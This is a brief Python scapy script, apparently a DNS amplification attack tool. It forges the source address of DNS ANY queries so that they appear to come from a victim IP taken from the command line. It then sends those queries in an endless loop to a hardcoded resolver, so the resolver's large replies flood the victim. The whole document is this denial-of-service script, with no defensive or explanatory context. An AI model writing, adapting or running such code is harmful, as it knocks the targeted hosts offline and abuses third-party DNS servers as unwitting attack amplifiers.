import sys
from scapy.all import *

def dns(s_ip,s_port):
    packet=IP(src=s_ip,dst="123.20.138.250")/UDP(sport=s_port,dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com",qtype=255))
    send(packet,loop=True)

if __name__ == "__main__":
   if len(sys.argv) < 3:
	    print("Usage: {} <target IP><port>".format(sys.argv[0]))
	    sys.exit(1)
	  
dns(sys.argv[1],int(sys.argv[2]))
